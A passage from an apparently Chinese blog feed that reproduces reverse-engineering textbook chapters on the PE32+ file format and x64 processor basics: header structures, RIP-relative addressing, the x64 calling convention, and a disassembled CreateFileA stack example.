 DWORD       BaseOfCode;<br>    ULONGLONG   ImageBase;<br>    DWORD       SectionAlignment;<br>    DWORD       FileAlignment;<br>    WORD        MajorOperatingSystemVersion;<br>    WORD        MinorOperatingSystemVersion;<br>    WORD        MajorImageVersion;<br>    WORD        MinorImageVersion;<br>    WORD        MajorSubsystemVersion;<br>    WORD        MinorSubsystemVersion;<br>    DWORD       Win32VersionValue;<br>    DWORD       SizeOfImage;<br>    DWORD       SizeOfHeaders;<br>    DWORD       CheckSum;<br>    WORD        Subsystem;<br>    WORD        DllCharacteristics;<br>    ULONGLONG   SizeOfStackReserve;<br>    ULONGLONG   SizeOfStackCommit;<br>    ULONGLONG   SizeOfHeapReserve;<br>    ULONGLONG   SizeOfHeapCommit;<br>    DWORD       LoaderFlags;<br>    DWORD       NumberOfRvaAndSizes;<br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<br>&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;<br></code></pre></td></tr></table></figure><p><strong>Magic</strong></p><p>首先，Magic字段值发生了改变，PE32中Magic值为010B，PE32+中Magic值为020B。WindowsPE装载器通过检查该字段值来区分IMAGE_OPTIONAL_HEADER结构体是32位的还是64位的。</p><p><strong>BaseOfData</strong></p><p>PE32文件中该字段用于指示数据节的起始地址（RVA），而PE32+文件中删除了该字段。</p><p><strong>ImageBase</strong></p><p>ImageBase字段（或称成员）的数据类型由原来的双字（DWORD）变为ULONGLONG类型（8个字节）。这是为了适应增大的进程虚拟内存。借助该字段，PE32+文件能够加载到64位进程的虚拟内存空间（16TB）的任何位置（EXE&#x2F;DLL文件被加载到低位的8TB用户区域，SYS文件被加载到高位的8TB内核区域）。</p><blockquote><p>AddressOfEntryPoints、SizeOflmage 等字段大小与原 PE32位是一样的，都是 DWORD大小（4个字节，32位）。这些字段的数据类型都是DWORD,意味着PE32+格式的文件占用的实际虚拟内存中，各映像的大小最大为4GB （32位）。但是由于ImageBase的大小为8个字节（64位），程序文件可以加载到进程虚拟内存中的任意地址位置。</p></blockquote><blockquote><p>※ PE文件的讲解中经常会提到“映像”（Image）—词，希望各位记住这个常用术语。加载PE文件到内存时并非按磁盘文件格式原封不动地进行，而是根据节区头中定义的节区起始地址、节区大小等属性加载。所以磁盘文件中的PE与内存中的PE状态是不同的。为了区分，我们将加载到内存中的PE称为映像。</p></blockquote><h2 id="38-1-4-IMAGE-THUNK-DATA"><a href="#38-1-4-IMAGE-THUNK-DATA" class="headerlink" title="38.1.4 IMAGE_THUNK_DATA"></a>38.1.4 IMAGE_THUNK_DATA</h2><p>IMAGE_THUNK_DATA结构体的大小由原来的4个字节变为8个字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_THUNK_DATA64</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        ULONGLONG ForwarderString;  <span class="hljs-comment">// PBYTE </span><br>        ULONGLONG Function;         <span class="hljs-comment">// PDWORD</span><br>        ULONGLONG Ordinal;<br>        ULONGLONG AddressOfData;    <span class="hljs-comment">// PIMAGE_IMPORT_BY_NAME</span><br>    &#125; u1;<br>&#125; IMAGE_THUNK_DATA64;<br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA64 * PIMAGE_THUNK_DATA64;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_THUNK_DATA32</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD ForwarderString;      <span class="hljs-comment">// PBYTE </span><br>        DWORD Function;             <span class="hljs-comment">// PDWORD</span><br>        DWORD Ordinal;<br>        DWORD AddressOfData;        <span class="hljs-comment">// PIMAGE_IMPORT_BY_NAME</span><br>    &#125; u1;<br>&#125; IMAGE_THUNK_DATA32;<br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA64              IMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> PIMAGE_THUNK_DATA64             PIMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY64           IMAGE_TLS_DIRECTORY;<br><span class="hljs-keyword">typedef</span> PIMAGE_TLS_DIRECTORY64          PIMAGE_TLS_DIRECTORY;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA32              IMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> PIMAGE_THUNK_DATA32             PIMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY32           IMAGE_TLS_DIRECTORY;<br><span class="hljs-keyword">typedef</span> PIMAGE_TLS_DIRECTORY32          PIMAGE_TLS_DIRECTORY;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>在PE32文件中跟踪INT、IAT值，会见到IMAGE_THUNK_DATA32结构体（大小为4个字节）数组，而PE32+文件中会岀现IMAGE_THUNK_DATA64结构体（大小为8个字节）数组。所以跟踪IAT时要注意数组元素的大小，如图38-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC38%E7%AB%A0%20PE32.assets/image-20220318190735188.png#alt=image-20220318190735188"></p><p>图38-1中圆圈内的部分就是IMAGE_THUNK_DATA结构体数组，一个为INT，另一个为IAT。装载PE文件时，OS的PE装载器会向IAT中写入真正的API入口地址（VA）, 64位OS中地址（指针）大小为8个字节（64位），所以IMAGE_THUNK_DATA结构体的大小只能增长到8个字节。</p><h2 id="38-1-5-IMAGE-TLS-DIRECTORY"><a href="#38-1-5-IMAGE-TLS-DIRECTORY" class="headerlink" title="38.1.5 IMAGE_TLS_DIRECTORY"></a>38.1.5 IMAGE_TLS_DIRECTORY</h2><p>IMAGE_TLS_DIRECTORY结构体的部分成员为VA，它们在PE32+中被扩展为8个字节。</p><p>IMAGE_TLS_DIRECTORY 结构体的 StartAddressOfRawData , EndAddressOfRawData、AddressOflndex、AddressOfCallBacks字段持有的都是VA值。所以它们被扩展为64位OS的地址大小（8个字节）。对PE+文件格式中改动部分的讲解到此结束。幸运的是，PE32+是在原PE32文件格式的基础上扩展而来的，如果熟悉了PE32文件格式，那么就能很轻松地掌握PE32+。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_TLS_DIRECTORY64</span> &#123;</span><br>    ULONGLONG   StartAddressOfRawData;<br>    ULONGLONG   EndAddressOfRawData;<br>    ULONGLONG   AddressOfIndex;         <span class="hljs-comment">// PDWORD</span><br>    ULONGLONG   AddressOfCallBacks;     <span class="hljs-comment">// PIMAGE_TLS_CALLBACK *;</span><br>    DWORD   SizeOfZeroFill;<br>    DWORD   Characteristics;<br>&#125; IMAGE_TLS_DIRECTORY64;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY64 * PIMAGE_TLS_DIRECTORY64;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_TLS_DIRECTORY32</span> &#123;</span><br>    DWORD   StartAddressOfRawData;<br>    DWORD   EndAddressOfRawData;<br>    DWORD   AddressOfIndex;             <span class="hljs-comment">// PDWORD</span><br>    DWORD   AddressOfCallBacks;         <span class="hljs-comment">// PIMAGE_TLS_CALLBACK *</span><br>    DWORD   SizeOfZeroFill;<br>    DWORD   Characteristics;<br>&#125; IMAGE_TLS_DIRECTORY32;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN64</span><br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA64              IMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> PIMAGE_THUNK_DATA64             PIMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY64           IMAGE_TLS_DIRECTORY;<br><span class="hljs-keyword">typedef</span> PIMAGE_TLS_DIRECTORY64          PIMAGE_TLS_DIRECTORY;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">typedef</span> IMAGE_THUNK_DATA32              IMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> PIMAGE_THUNK_DATA32             PIMAGE_THUNK_DATA;<br><span class="hljs-keyword">typedef</span> IMAGE_TLS_DIRECTORY32           IMAGE_TLS_DIRECTORY;<br><span class="hljs-keyword">typedef</span> PIMAGE_TLS_DIRECTORY32          PIMAGE_TLS_DIRECTORY;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><blockquote><p><strong>CFF Explorer</strong></p></blockquote><p>向各位推荐一个多功能的PE实用工具—CFF Explorer,它就像“瑞士军刀”（Swiss</p><p>Army Knife） —样，提供了多样化的功能，并且支持PE32+文件格式，是一款非常有</p><p>用的PE工具。</p><p>代码逆向分析人员进人64位环境后会遇到很多问题，其中最严重的是，原有的32位代码逆向分析工具无法继续在64位环境下使用。我喜欢用的PEView工具并不支持PE32+文件格式，所以这里向各位介绍CFF Explorer，它是一款支持PE32+的PE Viewer工具，如图38-2所示。</p><p><a href="http://www.ntcore.com/exsuite.php">http://www.ntcore.com/exsuite.php</a></p><p>除了PE Viewer功能外，CFF Explorer还提供PE编辑器、PE重建、RVA↔RAW转换器、反汇编器等综合功能，它是一个集多种功能于一身的强大的代码逆向分析工具。后面需要操作PE32+文件时，希望各位多多使用它。</p><blockquote><p>使用CFF Explorer工具可以非常方便地剪掉或添加节区。虽然使用好的工具可以增加处理的便利性，但是过分依赖它们将无益于提高自身的技术水平。所以刚开始学习代码逆向分析技术时，并不建议各位使用好的辅助工具，可以选择一些简单的工具，学习相关知识、了解它们的工作原理，然后通过练习进一步巩固所学的内容，这才是提升自身技术水平的正确途径。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第37章 x64处理器</title>
    <link href="/1999/03/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8/"/>
    <url>/1999/03/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>第37章x64处理器</p><p>要在64位环境中进行代码逆向分析，需要具备x64CPU的基础知识，本章将与各位一起学习。</p><h1 id="37-1-X64中新增或变更的项目"><a href="#37-1-X64中新增或变更的项目" class="headerlink" title="37.1 X64中新增或变更的项目"></a>37.1 X64中新增或变更的项目</h1><p>为了保持向下兼容，x64是在原有x86基础上扩展而来的。要在x64系统中进行代码逆向分析，必须先了解x64中新增或变更的内容。</p><blockquote><p>我们平时很少接触IA-64,此处略去不谈。x64中新增的内容比我们想象的要多得多，这里只讲解与代码逆向分析有关的部分。更详细的内容请参考Intel用户手册以及MSDN等相关信息。</p></blockquote><h2 id="37-1-1-64位"><a href="#37-1-1-64位" class="headerlink" title="37.1.1 64位"></a>37.1.1 64位</h2><p>64位系统中内存地址为64位（8个字节），使用64位大小的指针。所以含有绝对地址（VA）的指令大小比原来增加了4个字节。同样，寄存器的大小以及栈的基本单位也变为64位。</p><h2 id="37-1-2内存"><a href="#37-1-2内存" class="headerlink" title="37.1.2内存"></a>37.1.2内存</h2><p>x64系统中进程虚拟内存的实际大小为16TB（Trea Byte： 10）（内核空间与用户空间各占</p><p>8TB）。与x86的4GB（GigaByte: 109）相比，大小增加了非常多。</p><blockquote><p>用64位可以表示的数为2M&#x3D;16EB（Exa Byte: 10）,日常生活中不会看到这么大的数。所以64位的CPU理论上可以支持16EB大小的内存寻址（Memory Addressing）,但是考虑到实际性能，x64与IA-64都不支持这么大的虚拟内存，因为它会导致巨大的系统开销耗费在内存管理上。</p></blockquote><h2 id="37-1-3通用寄存器"><a href="#37-1-3通用寄存器" class="headerlink" title="37.1.3通用寄存器"></a>37.1.3通用寄存器</h2><p>x64系统中，通用寄存器的大小扩展到64位（8个字节），数量也增加到18个（新增了R8~R15寄存器）。x64系统下的所有通用寄存器的名称均以字母“R”开头（x86以字母“E”开头），如 图37-1所示。</p><p>为了实现向下兼容，支持访问寄存器的8位、16位、32位（例：AL、AX、EAX）。</p><blockquote><p>64位本地模式中不使用段寄存器：CS、DS、ES、SS、FS、GS，它们仅用于向下兼容32位程序。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8.assets/image-20220313130550781.png#alt=image-20220313130550781"></p><h2 id="37-1-4-CALL-x2F-JMP-指令"><a href="#37-1-4-CALL-x2F-JMP-指令" class="headerlink" title="37.1.4 CALL&#x2F;JMP 指令"></a>37.1.4 CALL&#x2F;JMP 指令</h2><p>32位的x86系统中，CALL&#x2F;JMP指令的使用形式为“地址指令CALL&#x2F;JMP”。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">AddressInstructionDisassembly<br>--------------------------------------------------------------<br><span class="hljs-number">00401000</span>FF1500504000CALL DWORD PTR DS:[<span class="hljs-number">00405000</span>];CALL <span class="hljs-number">75</span>CE1E12 (LoadLibraryW)<br>...<br><span class="hljs-number">00401030</span> FF2510504000 JMP DWORD PTR DS:[<span class="hljs-number">00405010</span>];JMP <span class="hljs-number">75</span>CE10EF (Sleep)<br>    <br>    <br><span class="hljs-number">00405000</span><span class="hljs-number">121</span>ECE75; <span class="hljs-number">75</span>CE1E12 (Kernel32!LoadLibraryW)<br>...<br><span class="hljs-number">00405010</span> EF10CE75 ; <span class="hljs-number">75</span>CE10EF (Kernel32!Sleep)<br></code></pre></td></tr></table></figure><p>FF15XXXXXXXX指令用于调用API,其中XXXXXXXX “绝对地址”指向IAT区域的某个位置。x64系统中仍使用相同指令，但解析方法不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">AddressInstructionDisassembly<br>--------------------------------------------------------------<br><span class="hljs-number">00000001</span>`<span class="hljs-number">00401000</span>FF15FA3F00O0CALL DWORD PTR DS:[<span class="hljs-number">00000001</span>`<span class="hljs-number">00405000</span>];CALL <span class="hljs-number">75</span>CE1E12 (LoadLibraryW)<br>...<br><span class="hljs-number">00000001</span>`<span class="hljs-number">00401030</span> FF250A400O00 JMP DWORD PTR DS:[<span class="hljs-number">00000001</span>`<span class="hljs-number">00405010</span>];JMP <span class="hljs-number">75</span>CE10EF (Sleep)<br>    <br>    <br><span class="hljs-number">00000001</span>`<span class="hljs-number">00405000</span><span class="hljs-number">121</span>ECE7500000000; <span class="hljs-number">00000000</span>`<span class="hljs-number">75</span>CE1E12 (Kernel32!LoadLibraryW)<br>...<br><span class="hljs-number">00000001</span>`<span class="hljs-number">00405010</span> EF10CE7500000000; <span class="hljs-number">00000000</span>`<span class="hljs-number">75</span>CE10EF (Kernel32!Sleep)<br></code></pre></td></tr></table></figure><p>首先指令地址由原来的4个字节变为8个字节，然后，x86中FF15指令后跟着4个字节的绝对地</p><p>址（VA）而是不想当然的8个字节。若x64中也采用与x86相同的方式，则FF15后面应该跟着8个字节的绝对地址（VA），这样指令的长度就增加了。为了防止增加指令长度，x64系统中指令后面仍然跟着4个字节大小的地址，只不过该地址被解析为“相对地址”（RVA）。所以上面的指令列表中，FF15后面的4个字节（3FFA）被识别为相对地址，并通过下面的方法将相对地址转换为绝对地址。</p><p>0000000<code>00401000+3FFA+6=00000001</code>00405000</p><p>□ 0000000&#96;00401000： CALL 指令地址</p><p>□ 3FFA：相对（地址）</p><p>□ 6： CALL指令（FF15XXXXXXXX)长度</p><p>□ 0000000&#96;00405000：变换后的绝对地址</p><p>由于0000000<code>00405000地址中存储着00000000</code>75CE1E12值，所以上面出现的第一个CALL</p><p>指令最后被解析为CALL 00000000&#96;75CElE12。</p><blockquote><p>关于指令解析方法请参考第49章“IA-32指令”。</p></blockquote><h2 id="37-1-5函数调用约定"><a href="#37-1-5函数调用约定" class="headerlink" title="37.1.5函数调用约定"></a>37.1.5函数调用约定</h2><p>x64系统中另一个重要的不同是函数调用约定。前面介绍过，32位系统中使用的函数调用约定包括cdecl、stdcall、fastcall等几种，但64位系统中它们统一为一种变形的fastcall。64位fastcall中最多可以把函数的4个参数存储到寄存器中传递。</p><table><thead><tr><th>参数</th><th>整数型</th><th>实数型</th></tr></thead><tbody><tr><td>1st</td><td>RCX</td><td>XMM0</td></tr><tr><td>2nd</td><td>RDX</td><td>XMM1</td></tr><tr><td>3rd</td><td>R8</td><td>XMM2</td></tr><tr><td>4th</td><td>R9</td><td>XMM3</td></tr></tbody></table><p>各参数顺序由寄存器确定，比如第一个参数总是存储在RCX（实数时为XMM0）中。若函数的参数超过4个，则与栈并用。也就是说，从第五个参数开始会存入栈来传递。此外，函数返回 时传递参数过程中所用的栈由<strong>调用者</strong>清理。看上去x64系统下的fastcall就像是32位系统下函数调用约定cdecl与fastcall方式的混合（所以前面我们把它称为变形的fastcall）。使用这种新的fastcall可以大大加快函数调用的速度。还有一点比较有意思的是，函数的前4个参数明明使用寄存器传递，但是栈中仍然为这4个参数预留了空间（32个字节）（下面的栈部分会详细讲解）。</p><h2 id="37-1-6-栈-amp-栈帧"><a href="#37-1-6-栈-amp-栈帧" class="headerlink" title="37.1.6 栈&amp;栈帧"></a>37.1.6 栈&amp;栈帧</h2><p>Windows 64位OS中使用栈与栈帧的方式也发生了变化。简言之，栈的大小比函数实际需要</p><p>的大小要大得多。调用子函数（Sub Function）时，不再使用PUSH命令来传递参数，而是通过MOV指令操作寄存器与预定的栈来传递。使用VC++创建的x64程序代码中几乎看不到PUSH&#x2F;POP指令。并且创建栈帧时也不再使用RBP寄存器，而是直接使用RSP寄存器来实现。</p><blockquote><p>使用Visual C++编译32位程序时，若开启了编译器的优化功能，则几乎看不到使用EBP寄存器的栈帧。</p></blockquote><p>该方式的优点是，调用子函数时不需要改变栈指针（RSP），函数返回时也不需要清理栈指</p><p>针，这样能够大幅提升程序的运行速度。下面通过一个练习示例进一步了解32位与64位栈工作原理的不同。</p><h1 id="37-2-练习：Stack32-exe-amp-Stack64-exe"><a href="#37-2-练习：Stack32-exe-amp-Stack64-exe" class="headerlink" title="37.2 练习：Stack32.exe &amp; Stack64.exe"></a>37.2 练习：Stack32.exe &amp; Stack64.exe</h1><p>通过CreateFile() API简单了解一下栈在32位与64位环境下分别是如何工作的，并比较它们工</p><p>作方式的不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    HANDLE hFile = INVALID_HANDLE_VALUE;<br>    <br>    hFile = CreateFileA(<span class="hljs-string">&quot;c:\\work\\ReverseCore.txt&quot;</span>,    <span class="hljs-comment">// 1st - (string)</span><br>                        GENERIC_READ,                   <span class="hljs-comment">// 2nd - 0x80000000</span><br>                        FILE_SHARE_READ,                <span class="hljs-comment">// 3rd - 0x00000001</span><br>                        <span class="hljs-literal">NULL</span>,                           <span class="hljs-comment">// 4th - 0000000000</span><br>                        OPEN_EXISTING,                  <span class="hljs-comment">// 5th - 0x00000003</span><br>                        FILE_ATTRIBUTE_NORMAL,          <span class="hljs-comment">// 6th - 0x00000080</span><br>                        <span class="hljs-literal">NULL</span>);                          <span class="hljs-comment">// 7th - 0x00000000</span><br><br>    <span class="hljs-keyword">if</span>( hFile != INVALID_HANDLE_VALUE )<br>        CloseHandle(hFile);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先使用Visual Studio 2012具将代码37-1分别编译为32位程序（Stack32.exe）与64位程序（Stack64.exe）。</p><h2 id="37-2-1-Stack32-exe"><a href="#37-2-1-Stack32-exe" class="headerlink" title="37.2.1 Stack32.exe"></a>37.2.1 Stack32.exe</h2><p>下面先调试32位Stack32.exe程序。使用OllyDbg工具打开Stack32.exe，转到main()函数处（401000），如图37-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8.assets/image-20220317221053443.png#alt=image-20220317221053443"></p><p>首先分析Stack32.exe的main()函数特征。</p><p>特征一，不使用栈帧。由于代码比较简单，变量又少，开启编译器的优化选项后，栈帧会被省略。</p><p>特征二，调用子函数（CreateFileA、CloseHandle）时使用栈传递参数。</p><p>特征三，使用PUSH指令压入栈的函数参数不需要main()函数清理。在32位环境中采用stdcall方式调用Win32 API时，由被调用者（CreateFileA、CloseHandle）清理栈。在图37-2中跟踪代码到401017地址的CreateFileA()函数处，查看栈，如图37-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8.assets/image-20220317221215693.png#alt=image-20220317221215693"></p><p>可以看到，函数的7个参数全部被压入栈。接着使用StepInto（F7）命令，进入CreateFileA() API，如图37-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8.assets/image-20220317222745820.png#alt=image-20220317222745820"></p><p>从图37-4中可以看到，CreateFileA() API使用了栈帧。并在调用CreateFileW() API之前使用PUSH指令将接收的参数压入栈。这样栈中就有了2份相同的参数（它们的区别在于第一份的7个参数为ASCII字符串格式，第二份的7个参数为Unicode字符串形式），如图37-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8.assets/image-20220317222511828.png#alt=image-20220317222511828"></p><p>图37-5描述的是调用CreateFileW() API时栈中的情形。从图中可以清楚看到，相同参数被重复存入栈。以上就是我们熟知的在32位环境中调用函数时栈的工作原理。</p><h2 id="37-2-2-Stack64-exe"><a href="#37-2-2-Stack64-exe" class="headerlink" title="37.2.2 Stack64.exe"></a>37.2.2 Stack64.exe</h2><p>下面调试64位Stack64.exe程序。使用WinDbg（x64）分析Stack64.exe的反汇编代码，如图37-6所示。</p><blockquote><p>正常运行&#x2F;调试本示例文件需要Windows XP&#x2F;Vista&#x2F;7 64位环境支持</p></blockquote><p>图37-6是在x64dbg 中调试Stack64.exe的画面。WinDbg下的64位程序的反汇编代码不带注释，且看上去比较复杂，简单整理如代码37-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC37%E7%AB%A0%20x64%E5%A4%84%E7%90%86%E5%99%A8.assets/image-20220317230818266.png#alt=image-20220317230818266"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0000000140001000</span> | <span class="hljs-number">48</span>:<span class="hljs-number">83</span>EC <span class="hljs-number">48</span>               | sub rsp,<span class="hljs-number">48</span>                              <br><span class="hljs-number">0000000140001004</span> | <span class="hljs-number">45</span>:<span class="hljs-number">33</span>C9                  | xor r9d,r9d                         ; <span class="hljs-number">4</span>th - pSecurity   <br><span class="hljs-number">0000000140001007</span> | <span class="hljs-number">48</span>:C74424 <span class="hljs-number">30</span> <span class="hljs-number">00000000</span>    | mov qword ptr ss:[rsp+<span class="hljs-number">30</span>],<span class="hljs-number">0</span>         ; <span class="hljs-number">7</span>th - hTemplateFile<br><span class="hljs-number">0000000140001010</span> | <span class="hljs-number">48</span>:<span class="hljs-number">8</span>D0D A1110000         | lea rcx,qword ptr ds:[<span class="hljs-number">1400021B</span>8]    ; <span class="hljs-number">1</span>st - FileName<br><span class="hljs-number">0000000140001017</span> | <span class="hljs-number">45</span>:<span class="hljs-number">8</span>D41 <span class="hljs-number">01</span>               | lea r8d,qword ptr ds:[r9+<span class="hljs-number">1</span>]         ; <span class="hljs-number">3</span>rd - ShareMode<br><span class="hljs-number">000000014000101B</span> | BA <span class="hljs-number">00000080</span>              | mov edx,<span class="hljs-number">80000000</span>                    ; <span class="hljs-number">2</span>nd - Access<br><span class="hljs-number">0000000140001020</span> | C74424 <span class="hljs-number">28</span> <span class="hljs-number">80000000</span>       | mov dword ptr ss:[rsp+<span class="hljs-number">28</span>],<span class="hljs-number">80</span>        ; <span class="hljs-number">6</span>th - Attributes<br><span class="hljs-number">0000000140001028</span> | C74424 <span class="hljs-number">20</span> <span class="hljs-number">03000000</span>       | mov dword ptr ss:[rsp+<span class="hljs-number">20</span>],<span class="hljs-number">3</span>         ; <span class="hljs-number">5</span>th - Mode<br><span class="hljs-number">0000000140001030</span> | FF15 CA0F0000            | call qword ptr ds:[&lt;&amp;CreateFileA&gt;]      <br><span class="hljs-number">0000000140001036</span> | <span class="hljs-number">48</span>:<span class="hljs-number">83F</span>8 FF               | cmp rax,FFFFFFFFFFFFFFFF                <br><span class="hljs-number">000000014000103</span>A | <span class="hljs-number">74</span> <span class="hljs-number">09</span>                    | je <span class="hljs-built_in">stack</span><span class="hljs-number">.140001045</span>                      <br><span class="hljs-number">000000014000103</span>C | <span class="hljs-number">48</span>:<span class="hljs-number">8B</span>C8                  | mov rcx,rax                             <br><span class="hljs-number">000000014000103F</span> | FF15 C30F0000            | call qword ptr ds:[&lt;&amp;CloseHandle&gt;]      <br><span class="hljs-number">0000000140001045</span> | <span class="hljs-number">33</span>C0                     | xor eax,eax                             <br><span class="hljs-number">0000000140001047</span> | <span class="hljs-number">48</span>:<span class="hljs-number">83</span>C4 <span class="hljs-number">48</span>               | add rsp,<span class="hljs-number">48</span>                              <br><span class="hljs-number">000000014000104B</span> | C3                       | 